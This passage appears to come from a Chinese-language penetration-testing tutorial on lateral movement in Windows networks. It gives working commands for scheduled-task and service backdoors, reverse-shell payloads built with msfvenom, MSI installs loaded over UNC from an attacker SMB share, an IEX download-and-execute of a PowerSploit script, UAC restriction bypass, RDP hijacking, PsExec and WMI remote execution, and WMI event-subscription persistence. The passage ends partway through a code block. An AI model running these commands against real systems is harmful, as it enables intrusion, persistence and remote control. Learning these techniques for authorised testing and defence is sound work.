class="line">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR C:\reverse_tcp.exe /RU System /F</span><br><span class="line"># /S，指定要连接到的系统;  /TN，指定要创建的计划任务的名称;  /SC，指定计划任务执行频率</span><br><span class="line"># /M0，指定计划任务执行周期;  /TR，指定计划任务运行的程序路径;  /RU，指定计划任务运行的用户权限</span><br><span class="line"># /F，如果指定的任务已经存在，则强制创建</span><br></pre></td></tr></table></figure><p>在远程主机上创建一个计划任务，每分钟执行一次上传的攻击载荷。</p><p>如果没有建立<strong>IPC</strong>连接，就需要手动指定远程主机的用户凭据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR C:\reverse_tcp.exe /RU System /F /U Administrator /P Admin@123</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 192.168.111.136 /TN Backdoor /SC minute /MO 1 /TR C:\Users\bob\Desktop\hack.exe /RU System /F /U Administrator /P 1qaz@WSX</span><br></pre></td></tr></table></figure><h3 id="UNC路径加载执行"><a href="#UNC路径加载执行" class="headerlink" title="UNC路径加载执行"></a>UNC路径加载执行</h3><p><strong>Windows</strong>系统中使用<strong>UNC</strong>路径来访问网络共享资源，格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\servername\sharename\directory\filename</span><br></pre></td></tr></table></figure><p>其中，<strong>servername</strong>是服务器主机名，<strong>sharename</strong>是网络共享的名称，<strong>directory</strong>和<strong>filename</strong>分别为该共享下的目录和文件。<br>在远程主机上攻击载荷时，可以直接使用<strong>UNC</strong>路径代替常规的本地路径，让远程主机直接在测试人员搭建的<strong>SMB</strong>共享中加载攻击载荷并执行。这样可以省去手动上传攻击载荷的步骤。这里以计划任务为例进行演示，其他类似创建服务、<strong>PsExec</strong>、<strong>WMI</strong>、<strong>DCOM</strong>等远程执行方法都适用。</p><ol><li>测试人员在一台可控的服务器上搭建<strong>SMB</strong>匿名共享服务，并将生成的攻击载荷放入共享目录。</li><li>执行以下命令在靶机上生成攻击载荷并执行。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 192.168.111.135 /TN Backdoor /SC minute /MO 1 /TR \\192.168.111.136\smb\hack.exe /RU System  /F /U Administrator /P 1qaz@WSX</span><br></pre></td></tr></table></figure><h2 id="利用系统服务"><a href="#利用系统服务" class="headerlink" title="利用系统服务"></a>利用系统服务</h2><h3 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h3><p>除了创建计划任务，测试人员还可以通过在远程主机上创建系统服务的方式，在远程主机上运行指定的程序或命令。该方式需要拥有两端主机的管理员权限和**IPC$**连接，具体操作如下。</p><ul><li><p>利用已建立的共享连接向远程主机（<strong>192.168.111.135</strong>）上传攻击载荷。</p></li><li><p>利用已建立的<strong>IPC</strong>连接在远程主机上创建系统服务。执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.111.135 create Backdoor binpath= &quot;cmd.exe /k C:\reverse_tcp.exe&quot;</span><br><span class="line"># binpath,指定服务启动时运行的二进制文件，注意&quot;=&quot;后需要有一个空格</span><br></pre></td></tr></table></figure></li></ul><p>在远程主机上创建一个名为<strong>Backdoor</strong>的系统服务，服务启动时将执行上传的攻击载荷</p><ul><li><p>执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.111.135 start Backcdoor</span><br></pre></td></tr></table></figure></li><li><p>攻击结束后，将创建的服务删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.111.135 delete Backdoor</span><br></pre></td></tr></table></figure></li></ul><h3 id="SCShell"><a href="#SCShell" class="headerlink" title="SCShell"></a>SCShell</h3><p><strong>SCShell</strong>是一款利用系统服务的无文件横向移动工具。与传统的创建远程服务的方法不同，<strong>SCShell</strong>利用提供的用户凭据，通过<strong>ChangeServiceConfigA API</strong>修改远程主机上的服务配置，将服务的二进制路径名修改为指定的程序或攻击载荷，然后重启服务。执行结束后，服务二进制路径将恢复为原始路径。<br><strong>SCShell</strong>需要提供远程主机的管理员权限用户的凭据，并且需要已知远程主机上的系统服务名称。方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SCShell.exe 10.10.10.19 XblAuthManager &quot;C:\Windows\System32\cmd.exe /c calc&quot; hack-my.com Administrator Admin@123</span><br><span class="line"># SCShell.exe  &lt;Target&gt; &lt;Service Name&gt; &lt;Payload&gt; &lt;Domain&gt; &lt;Username&gt; &lt;Password&gt; </span><br></pre></td></tr></table></figure><p>下面通过<strong>Regsvr32</strong>执行外部SCT文件的方式上线远程主机</p><ol><li>通过<strong>MetaSploit</strong>启动一个<strong>Web Delivery</strong>，并生成用于<strong>Regsvr32</strong></li></ol><h3 id="UAC-Remote-Restrictions"><a href="#UAC-Remote-Restrictions" class="headerlink" title="UAC Remote Restrictions"></a>UAC Remote Restrictions</h3><p><strong>UAC</strong>（用户账户控制）使计算机用户能够以非管理员身份执行日常任务。本地管理员组中任何非<strong>RID 500</strong>的其他管理员用户也将使用最小权限原则运行大多数应用程序，具有类似标准用户的权限。当执行需要管理员权限的任务时，<strong>Windows</strong>会自动提示用户予以批准。<br>为了更好地保护属于本地管理员组成员的用户，微软在<strong>Windows Vista</strong>以后的操作系统中引入了<strong>UAC Remote Restrictions</strong>（远程限制）。此机制有助于防止本地恶意软件以管理权限远程运行。因此，如果测试人员使用计算机本地用户进行需要管理员权限的远程管理操作，无论是<strong>schtasks</strong>还是后面要讲到的<strong>PsExec</strong>、<strong>WMI</strong>、<strong>WinRM</strong>、哈希传递攻击，都只能使用<strong>RID500</strong>（<strong>Administrator</strong>）的本地管理员用户，使用其他任何用户包括非<strong>RID 500</strong>的本地管理员用户都会提示“拒绝访问”。<br>注意，<strong>UAC Remote Restrictions</strong>只限制本地用户，域管理员用户不受限制，因此会在很大程度上限制工作组环境中的横向移动。有条件的可以通过执行以下命令并重启系统来关闭<strong>UAC Remote Restrictions</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure><h2 id="远程桌面利用"><a href="#远程桌面利用" class="headerlink" title="远程桌面利用"></a>远程桌面利用</h2><p>远程桌面协议（<strong>Remote Desktop Protocol，RDP</strong>）是微软从<strong>Windows Server 2000</strong>开始提供的功能，用户可以通过该功能登录并管理远程主机，所有操作就像在自己的计算机上操作一样。远程桌面协议默认监听<strong>TCP3389</strong>端口。</p><p>利用远程桌面进行横向移动是常见的方法。当内网中的其他主机开启了远程桌面服务后，测试人员可以通过已获取的用户凭据，借助内网代理等技术进行远程登录，通过远程桌面服务对目标主机进行实时操作。但是这种方法可能将已登录的用户强制退出，容易被管理员发现。</p><h3 id="远程桌面的确定和开启"><a href="#远程桌面的确定和开启" class="headerlink" title="远程桌面的确定和开启"></a>远程桌面的确定和开启</h3><p>执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</span><br></pre></td></tr></table></figure><p>通过查询注册表来确定当前主机是否开启了远程桌面功能。若字段值为0（即图中的0x0），则说明<strong>RDP</strong>服务以启动，若为1，则说明<strong>RDP</strong>服务已禁用。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231109221525101.png" alt="image-20231109221525101" style="zoom: 67%;"><p>执行以下命令，可在本地开启远程桌面功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#开启远程桌面连接功能</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">#关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权） </span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\winstations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0</span><br><span class="line"></span><br><span class="line">#设置防火墙策略放行3389端口</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><p>对于远程主机，可以通过<strong>WMI</strong>来开启远程桌面功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /Node:192.168.111.135 /User:Administrator /Password:1qaz@WSX RDTOGGLE WHERE ServerName=&#x27;JOHN&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure><p>需要指定远程主机的IP、主机名和用户凭据</p><h3 id="RDP-Hijacking"><a href="#RDP-Hijacking" class="headerlink" title="RDP Hijacking"></a>RDP Hijacking</h3><p>对于开启远程桌面服务的<strong>Windows</strong>计算机，当多个用户进行登录时，会产生多个会话。渗透测试人员可以通过已获取的<strong>SYSTEM</strong>权限劫持其他用户的<strong>RDP</strong>会话，并在未授权的情况下成功登入目标系统，即使该用户的会话已断开。这种攻击方法被称为**<code>RDP Hijacking</code><strong>（</strong>远程桌面劫持**），于2017年由以色列安全研究员Alexander Korznikov在个人博客中披露。</p><p>远程桌面劫持需要获取系统<strong>SYSTEM</strong>权限并执行<strong>tscon</strong>命令。该命令提供了一个切换用户会话的功能。在正常情况下，切换会话时需要提供目标用户的登录密码，但在<strong>SYSTEM</strong>权限下能够完全绕过验证，不输入密码即可切换到目标用户的会话，从而实现未授权登录。读者可以自行阅读相关文章，以了解更多细节。<br>例如，测试人员获取到了某台主机的普通用户权限，并以该用户成功登录远程桌面，然后执行<code>query user</code>命令，发现该主机上还存在其他用户的会话记录。其中，<strong>Marcus</strong>和<strong>Administrator</strong>用户的会话已断开，<strong>Vincent</strong>用户的会话为活跃状态。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231126135558486.png" alt="image-20231126135558486" style="zoom:130%;"><p>此时，如果可以通过提权方法获取系统<strong>SYSTEM</strong>权限，就可以在不提供其他用户登录凭据的情况下劫持用户的<strong>RDP</strong>会话。在<strong>Meterpreter</strong>中提权至<strong>SYSTEM</strong>权限后，执行以下命令，<strong>rdesktop</strong>成功切换到<strong>Administrator</strong>用户的桌面。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231126135625403.png" alt="image-20231126135625403" style="zoom:150%;"><h3 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h3><p><strong>SharpRDP</strong>是一款开源工具，可以通过远程桌面协议在远程主机上执行系统命令，且不需<strong>GUI</strong>客户端。该工具需要远程主机开启远程桌面功能，并且防火墙放行<strong>3389</strong>端口。<br>通常在内网渗透时，如果想登录一台内网主机的远程桌面，需要先搭建内网代理，然后使用<strong>RDP</strong>客户端进行连接。但是，测试人员可以直接将<strong>SharpRDP</strong>上传到跳板机，然后获取到的用户凭据，对内网其他主机执行系统命令。这样就省去了内网代理等中间环节。了解更多关于<strong>SharpRDP</strong>工具的细节，请阅读相关文章。</p><h2 id="PsExec远程控制"><a href="#PsExec远程控制" class="headerlink" title="PsExec远程控制"></a>PsExec远程控制</h2><p><strong>PsExec</strong>是微软官方提供的一款实用的<strong>Windows</strong>远程控制工具，可以根据凭据在远程系统上执行管理操作，并且可以获得与命令行几乎相同的实时交互性。<strong>PsExec</strong>最强大的功能之一就是可以在远程系统中启动交互式命令提示窗口，以便实时显示有关远程系统的信息。<br><strong>PsExec</strong>原理是通过<strong>SMB</strong>连接到服务端的<code>Admin$</code>共享，并释放名为<strong>psexesvc.exe</strong>的二进制文件，然后注册名为<strong>PSEXESVC</strong>服务。当客户端执行命令时，服务端通过<strong>PSEXESVC</strong>服务启动相应的程序执行命令并回显数据。运行结束后，<strong>PSEXESVC</strong>服务会被删除用<strong>PsExec</strong>进行远程操作需要具备以下条件：</p><ol><li>远程主机开启了<code>Admin$</code>共享</li><li>远程主机未开启防火墙或放行<strong>445</strong>端口。执行以下命令：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -accepteula \\10.10.10.19 -u HACK-MY\Administrator -p Admin@123 -s cmd.exe</span><br><span class="line"># -accepteula，禁止弹出许可证对话框；-u，指定远程主机的用户名；-p，指定用户的密码</span><br><span class="line"># -s，以SYSTEM权限启动进程，如果未指定该参数，就将以管理员权限启动进程</span><br></pre></td></tr></table></figure><p>用域管理员用户的凭据连接远程主机（<strong>10.10.10.19</strong>），并以<strong>SYSTEM</strong>权限启动一个交互式命令行</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231126170234479.png" alt="image-20231126170234479" style="zoom:80%;"><p>在内网渗透中，如果已有相应凭据，那么可以直接使用<strong>PsExec</strong>连接远程主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -accepteula \\192.168.54.136 cmd.exe</span><br></pre></td></tr></table></figure><p><strong>Impacket</strong>和<strong>Metasploit</strong>都内置了基于<strong>PsExec</strong>执行远程命令的脚本或模块，如<strong>Impacke</strong>中的<strong>psexec.py</strong>脚本、<strong>Metasploit</strong>中的<code>exploit/windows/smb/psexec</code>模块都可以完成相同的操作。读者可以在本地自行测试，这里不再赘述。</p><h2 id="WMI的利用"><a href="#WMI的利用" class="headerlink" title="WMI的利用"></a>WMI的利用</h2><p><strong>WMI</strong>（<strong>Windows Management Instrumentation , Windows</strong>管理规范）是一项核心的<strong>Windows</strong>管理技术。用户可以通过<strong>WMI</strong>管理本地和远程计算机。<strong>Windows</strong>为远程传输<strong>WMI</strong>数据提供了两个可用的协议，即分布式组件对象模型（<strong>Distributed Component Object Model , DCOM</strong>）和<strong>Windows</strong>远程管理（<strong>Windows Remote Management , WinRM</strong>），使得<strong>WMI</strong>对象的查询、事件注册、<strong>WMI</strong>类方法的执行和类的创建等操作都能够远程进行。<br>在横向移动时，测试人员可以利用<strong>WMI</strong>提供的管理功能，通过已v的用户凭据，与本地或远程主机进行交互，并控制其执行各种行为。目前有两种常见的利用方法：一是通过调用<strong>WMI</strong>的类进行远程执行，如<strong>Win32_Process</strong>类中的<strong>Create</strong>方法可以在远程主机上创建进程，<strong>Win32 Product</strong>类中的<strong>Install</strong>方法可以在远程主机上安装恶意的<strong>MSI</strong>，二是远程部署<strong>WMI</strong>事件订阅，在特定条的事件发生时触发攻击。<br>利用<strong>WMI</strong>进行横向移动需要具备以下条件：</p><ol><li>远程主机的<strong>WM</strong>征服务为开启状态（默认开启）；</li><li>远程主机防火墙放行<strong>135</strong>端口，这是<strong>WMI</strong>管理的默认端口。</li></ol><h4 id="常规利用方法"><a href="#常规利用方法" class="headerlink" title="常规利用方法"></a>常规利用方法</h4><p>在<strong>Windows</strong>上可以通过<strong>wmic.exe</strong>和<strong>PowerShell Cmdlet</strong>来使用<strong>WMI</strong>数据和执行<strong>WMI</strong>方法。<strong>Wmic.exe</strong>是一个与<strong>WMI</strong>进行交互的强大的命令行工具，拥有大量的<strong>WMI</strong>对象的默认别名，可以执行许多复杂的查询。<strong>Windows PowerShell</strong>也提供了许多可以与<strong>WMI</strong>进行交互的<strong>Cmdlet</strong>，如<strong>Invoke-WmiMethod</strong>、<strong>Set-WmiInstance</strong>等。</p><h5 id="1-执行远程查询"><a href="#1-执行远程查询" class="headerlink" title="1.执行远程查询"></a>1.执行远程查询</h5><p>执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.111.136 /user:Administrator /password:Admin@123 process list brief </span><br><span class="line">#/node，指定远程主机的地址；/user，指定远程主机的用户名；/password，指定用户的密码</span><br></pre></td></tr></table></figure><p>通过<strong>WMIC</strong>查询远程主机（<strong>192.168.111.136</strong>）上运行的进程信息</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127104603826.png" alt="image-20231127104603826" style="zoom:120%;"><h5 id="2-创建远程进程"><a href="#2-创建远程进程" class="headerlink" title="2.创建远程进程"></a>2.创建远程进程</h5><p>执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:190.168.111.136 /user:Administrator /password:Admin@123 process call create &quot;cmd.exe /c ipconfig &gt; C:\result.txt&quot;</span><br></pre></td></tr></table></figure><p>通过调用<strong>Win32_Process.Create</strong>方法在远程主机上创建进程，启动<strong>CMD</strong>来执行系统命令</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127105257089.png" alt="image-20231127105257089" style="zoom:120%;"><p>由于<strong>WMIC</strong>在执行命令时没有回显，因此可以将执行结果写入文件，然后通过建立共享连接等方式使用<strong>type</strong>命令远程读取</p><h5 id="3-远程安装MSI文件"><a href="#3-远程安装MSI文件" class="headerlink" title="3.远程安装MSI文件"></a>3.远程安装MSI文件</h5><p>通过调用<strong>Win32_Product.Install</strong>方法，可以控制远程主机安装恶意的<strong>MSI（Microsoft Installer）</strong>文件，从而获取其权限。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127105516687.png" alt="image-20231127105516687" style="zoom:120%;"><ol><li><p>使用<strong>MetaSploit</strong>生成一个恶意的<strong>MSI</strong>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 LPORT=4444 -f msi -o reverse_tcp.msi</span><br></pre></td></tr></table></figure></li><li><p>在一台测试人员可控的服务器上搭建<strong>SMB</strong>共享服务器，并将生成的<strong>MSI</strong>文件放入共享目录</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127105921853.png" alt="image-20231127105921853" style="zoom:120%;"></li><li><p>在跳板机上执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:10.10.10.19 /user:Administrator /password:Admin@123 product call install PackageLocation=&quot;\\192.168.2.143\evilsmb\reverse_tcp.msi&quot;</span><br></pre></td></tr></table></figure><p>控制远程主机（<strong>10.10.10.19</strong>），通过<strong>UNC</strong>路径进行远程加载测试人员服务器的<strong>MSI</strong>文件并进行安装，成功获取远程主机的权限。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127110246177.png" alt="image-20231127110246177" style="zoom:130%;"></li></ol><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127110308355.png" alt="image-20231127110308355" style="zoom:120%;"><h3 id="常见利用工具"><a href="#常见利用工具" class="headerlink" title="常见利用工具"></a>常见利用工具</h3><h5 id="1-Wmiexec"><a href="#1-Wmiexec" class="headerlink" title="1.Wmiexec"></a>1.Wmiexec</h5><p><strong>Impacket</strong>项目的<strong>wmiexec.py</strong>能够以全交互或半交互的方式，通过<strong>WMI</strong>在远程主机上执行命令。注意，该工具需要远程主机开启<strong>135</strong>和<strong>445</strong>端口，其中<strong>445</strong>端口用于传输命令执行的回显。<br>执行以下命令，获取远程主机的交互式命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py HACK-MY/Administrator:Admin\@123@10.10.10.19</span><br><span class="line"># python wmiexec.py &lt;Domain&gt;/&lt;Username&gt;:&lt;Password&gt;@&lt;IP&gt;</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127111115193.png" alt="image-20231127111115193" style="zoom:130%;"><p>如果是在<strong>Windows</strong>平台上使用，可以通过<strong>PyInstaller</strong>，将<strong>wmiexec.py</strong>打包成独立的<strong>exe</strong>可执行文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 安装PyInstaller模块</span><br><span class="line">pip3 Install pyinstaller</span><br><span class="line"># 进入wmiexec.py所在目录并执行打包操作，将在dist目录中生成wmiexec,exe </span><br><span class="line">cd impacket\examples </span><br><span class="line">pyinstaller -F wmiexec.py</span><br></pre></td></tr></table></figure><p>打包完成后，生成的<strong>wmiexec.exe</strong>可直接上传到<strong>Windows</strong>主机中运行，使用方法与原来的<strong>wmiexec.py</strong>相同，结果如图5-6-8所示</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127111755713.png" alt="image-20231127111755713" style="zoom:130%;"><h5 id="2-Invoke-WmiCommand"><a href="#2-Invoke-WmiCommand" class="headerlink" title="2.Invoke-WmiCommand"></a>2.Invoke-WmiCommand</h5><p><strong>Invoke-WmiCommand.ps1 <strong>是 <strong>PowerSploit <strong>项目中的一个脚本，可以通过</strong>PowerShell</strong>调用</strong>WMI</strong>来远程执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 远程加载Invoke-WmiCommand.ps1脚本</span><br><span class="line">IEX(New-object Net.Webclient).Downloadstring(&#x27;http://IP:Port/Invoke-WmiCommand.ps1&#x27;)</span><br><span class="line"># 指定远程系统用户名</span><br><span class="line">$User = &quot;HACK-MY\Administrator&quot;</span><br><span class="line"># 指定用户的密码</span><br><span class="line">$Password = ConvertTo-SecureString -String &quot;Admin@123&quot; -AsPlainText -Force</span><br><span class="line"># 将用户名和密码整合，以便导入Credential </span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password</span><br><span class="line"># 指定远程主机的IP和要执行的命令</span><br><span class="line">$Remote = Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName &quot;10.10.10.19&quot;</span><br><span class="line"># 输出命令执行回显</span><br><span class="line">$Remote.PayloadOutput</span><br></pre></td></tr></table></figure><p>执行成功后，可以得到结果回显</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127170101806.png" alt="image-20231127170101806" style="zoom:120%;"><p>此外，<strong>PowerShell</strong>内置的<strong>Invoke-WMIMethod</strong>也可以在远程系统中执行命令或程序，但是没有执行回显。具体使用方法请读者自行查阅相关资料。</p><h4 id="WMI事件订阅的利用"><a href="#WMI事件订阅的利用" class="headerlink" title="WMI事件订阅的利用"></a>WMI事件订阅的利用</h4><p><strong>WMI</strong>提供了强大的事件处理系统，几乎可以用于对操作系统上发生的任何事件做出响应。例如，当创建某进程时，通过<strong>WMI</strong>事件订阅来执行预先设置的脚本。其中，触发事件的具体条件被称为“事件过滤器”（<strong>Event Filter</strong>），如用户登录、新进程创建等，对指定事件发生做出的响应被称为“事件消费者”（<strong>Event Consumer</strong>），包括一系列具体的操作，如运行脚本、记录日志、发送邮件等。在部署事件订阅时，需要分别构建<strong>Filter</strong>和<strong>Consumer</strong>两部分，并将二者绑定在一起。<br>所有的事件过滤器都被存储为一个<code>ROOT\subscription:__EventFilter</code>对象的实例，可以通过创建<code>__EventFilter</code>对象实例来部署事件过滤器。事件消费者是基于<code>ROOT\subscription:__EventConsumer</code>系统类派生来的类。系统提供了常用的标准事件消费类，如需了解更多细节，读者可以查阅微软提供的相关文档。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127171329285.png" alt="image-20231127171329285" style="zoom:120%;"><p>测试人员可以使用<strong>WMI</strong>的功能在远程主机上部署永久事件订阅，并在特定事件发生时执行任意代码或系统命令。使用<strong>WMI</strong>事件消费类的<strong>ActiveScriptEventConsumer</strong>和<strong>CommandLineEventConsumer</strong>，可以在远程主机上执行任何攻击载荷。该技术主要用来在目标系统上完成权限持久化，亦可用于横向移动，并且需要提供远程主机的管理员权限的用户凭据。</p><h5 id="1-手动利用"><a href="#1-手动利用" class="headerlink" title="1.手动利用"></a>1.手动利用</h5><p>下面通过手动执行<strong>PowerShell</strong>命令来讲解利用工程</p><ol><li><p>整合<strong>PSCredentical</strong>，用于后续过程认证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$Username = &quot;HACK-MY\Administrator&quot;</span><br><span class="line">$Password = &quot;Admin@123&quot;</span><br><span class="line">$SecurePassword = $Password | ConvertTo-SecureString -AsPlainText -Force</span><br><span class="line">$Credential = New-object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword</span><br></pre></td></tr></table></figure></li><li><p>设置攻击目标和其他公共参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$GlobalArgs=e@&#123;&#125;</span><br><span class="line">$ComputerName = &quot;10.10.10.19&quot;</span><br><span class="line">$GlobalArgs[&#x27;Credential&#x27;]= $Credential</span><br><span class="line">$GlobalArgs[&#x27;ComputerName&#x27;] = $ComputerName</span><br></pre></td></tr></table></figure></li><li><p>在远程主机（<strong>10.10.10.19</strong>）上部署“<strong>TestFilter</strong>”事件过滤器，用于查询<strong>svchost.exe</strong>进程的产生。由于<strong>WMI</strong>所有的事件过滤器都被存储为<strong>ROOT\subscription:__EventFilter</strong>对象的实例，因此通过<strong>Set-WmiInstance Cmdlet</strong>创建一个**__EventFilter**类的实例即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$EventFilterArgs = @&#123;</span><br><span class="line">EventNamespace = &#x27;root/cimv2&#x27;</span><br><span class="line">Name = &quot;TestFilter&quot;</span><br><span class="line">Query = &quot;SELECT * FROM Win32_ProcessStartTrace where processname =&#x27;svchost.exe&#x27;&quot;</span><br><span class="line">QueryLanguage = &#x27;WQL&#x27;</span><br><span class="line">&#125;</span><br><span class="line">$EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs @GlobalArgs</span><br></pre></td></tr></table></figure></li><li><p>在远程主机上部署一个名为<strong>TestConsumer</strong>的事件消费者，创建事件消费类<strong>CommandLineEventConsumer</strong>的实例，在指定事件发生时执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$CommandLineEventConsumerArgs = @&#123;</span><br><span class="line">Name = &quot;TestConsumer&quot;</span><br><span class="line">CommandLineTemplate = &quot;C：\Windows\System32\cmd.exe /c calc.exe&quot;</span><br><span class="line">&#125;</span><br><span class="line">$EventConsumer = Set-WmiInstance -Namespace root\subscription -class </span><br><span class="line">CommandLineEventConsumer -Arguments $CommandLineEventConsumerArgs @GlobalArgs</span><br></pre></td></tr></table></figure></li><li><p>将创建的事件过滤器和事件消费者绑定在一起</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$FilterConsumerBindingArgs = 